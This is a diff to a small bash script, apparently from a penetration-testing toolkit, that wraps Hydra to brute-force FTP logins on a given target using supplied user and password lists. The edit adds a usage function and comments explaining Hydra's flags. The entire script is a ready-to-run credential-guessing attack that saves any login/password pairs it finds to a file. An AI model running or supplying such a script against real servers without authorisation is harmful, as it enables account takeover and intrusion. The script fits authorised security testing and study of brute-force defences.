@@ -1,8 +1,24 @@
 #!/usr/bin/env bash
-if [ $# -ne 3 ]; then
+usage () {
     echo "[*] FTP login brute force"
     echo "[*] Usage : $0 <target> <user.lst> <pass.lst>"
-    exit 0
+    exit 1
+}
+
+if [ $# -eq 3 ]; then
+    hydra -L $2 -P $3 -f -o ftp-hydra.txt -u $1 -s 21 ftp
+else
+    usage
 fi
 
-hydra -L $2 -P $3 -f -o ftp-hydra.txt -u $1 -s 21 ftp
+    #    -o FILE
+    #           write found login/password pairs to FILE instead of stdout
+    #    -f     exit after the first found login/password pair (per host if -M)
+    #    -l LOGIN
+    #           or -L FILE login with LOGIN name, or load several logins from FILE
+    #    -p PASS
+    #           or -P FILE try password PASS, or load several passwords from FILE
+    #    -u     by default Hydra checks all passwords for one login and then tries the next login. This option loops around the passwords, so the first pass‐    
+    #           word is tried on all logins, then the next password.
+    #    -s PORT
+    #           if the service is on a different default port, define it here
